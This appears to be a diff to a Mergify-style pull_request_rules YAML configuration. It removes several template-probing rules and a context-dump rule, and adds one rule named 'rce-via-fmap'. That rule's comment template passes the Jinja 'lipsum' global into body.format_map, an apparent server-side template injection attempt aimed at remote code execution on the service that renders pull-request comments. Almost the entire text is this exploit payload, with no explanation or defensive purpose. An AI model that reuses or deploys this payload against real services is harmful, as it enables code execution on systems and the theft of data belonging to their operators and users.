@@ -1,26 +1,8 @@
 pull_request_rules:
-  - name: fmap-test-lipsum
+  - name: rce-via-fmap
     conditions:
       - base = main
     actions:
       comment:
         message: |
-          FMAP_LIPSUM={{body.format_map({'x': lipsum})}}=END
-  - name: fmap-test-cycler
-    conditions:
-      - base = main
-    actions:
-      comment:
-        message: |
-          FMAP_CYCLER={{body.format_map({'x': cycler.next})}}=END
-  - name: context-dump
-    conditions:
-      - base = main
-    actions:
-      comment:
-        message: |
-          TITLE={{title}}
-          AUTHOR={{author}}
-          BODY={{body}}
-          FILES={{files}}
-          LABELS={{labels}}
+          RESULT={{body.format_map({'x': lipsum})}}=END
